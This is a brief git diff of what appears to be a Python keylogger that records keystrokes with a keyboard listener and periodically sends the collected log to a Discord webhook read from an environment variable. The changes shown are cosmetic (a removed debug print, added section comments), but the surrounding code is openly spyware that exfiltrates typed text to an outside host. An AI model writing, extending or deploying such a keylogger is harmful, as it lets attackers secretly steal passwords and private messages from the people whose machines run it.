@@ -5,16 +5,14 @@ from dotenv import load_dotenv
 import os
 import threading
 
-load_dotenv() # load the webhook url from .env file
+load_dotenv()
 
+# GLOBAL VARIABLES
 WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK')
-print("WEBHOOK_URL", WEBHOOK_URL)
 SEND_INTERVAL = 10
-
 caps_on = False
 shift_pressed = False
 keylog = ""
-
 valid_chars = string.ascii_letters + string.digits + string.punctuation
 
 def send_data_to_webhook(data):
@@ -85,5 +83,6 @@ def on_release(key):
 
 periodic_send()
 
+# MAIN
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
